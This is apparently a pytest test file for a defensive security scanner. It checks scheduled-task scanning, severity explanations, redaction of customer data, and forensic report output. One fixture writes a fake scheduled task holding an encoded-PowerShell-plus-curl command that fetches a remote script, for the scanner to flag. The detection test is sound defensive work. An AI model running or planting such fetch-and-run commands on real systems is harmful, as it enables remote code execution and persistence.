from pathlib import Path

from subreparo_immune.forensic_report import build_forensic_report
from subreparo_immune.models import Finding, FindingType, Severity
from subreparo_immune.redaction import redact_text
from subreparo_immune.scheduled_task_scan import scan_scheduled_tasks
from subreparo_immune.severity_explain import explain_severity, severity_sentence


def test_scheduled_task_scan_finds_risky_network_command(tmp_path: Path) -> None:
    task_dir = tmp_path / "scheduled_tasks"
    task_dir.mkdir()
    (task_dir / "backup.xml").write_text(
        "<Task><Command>powershell -enc AAAA; curl https://example.com/a.ps1</Command></Task>",
        encoding="utf-8",
    )

    findings = scan_scheduled_tasks(tmp_path)

    assert len(findings) == 1
    assert findings[0].severity == Severity.HIGH
    assert "scheduled task" in findings[0].message


def test_severity_explanation_returns_operator_action() -> None:
    finding = Finding(
        type=FindingType.IMMUNE_PATROL,
        severity=Severity.CRITICAL,
        target="src/app.py",
        message="blocked hash",
        recommendation="keep isolated",
    )

    explanation = explain_severity(finding)

    assert explanation["risk_band"] == "critical"
    assert "Keep isolated" in explanation["operator_action"]
    assert "critical risk" in severity_sentence(finding)


def test_customer_data_redaction_patterns() -> None:
    text = "Email a@example.com phone 555-123-4567 ssn 123-45-6789 customer_id=ABC12345 card 4111 1111 1111 1111"

    redacted = redact_text(text)

    assert "<EMAIL>" in redacted
    assert "<PHONE>" in redacted
    assert "<SSN>" in redacted
    assert "customer_id=<CUSTOMER_ID>" in redacted
    assert "<CARD_NUMBER>" in redacted


def test_forensic_report_writes_markdown(tmp_path: Path) -> None:
    state = tmp_path / ".subreparo"
    state.mkdir()
    (state / "report.md").write_text("# Report\n", encoding="utf-8")
    (state / "trust_report.json").write_text("{}\n", encoding="utf-8")
    (state / "report_signature.json").write_text("{}\n", encoding="utf-8")

    payload = build_forensic_report(tmp_path)

    assert payload["schema"] == "subreparo.forensic_report.v1"
    assert (state / "forensic_report.md").exists()
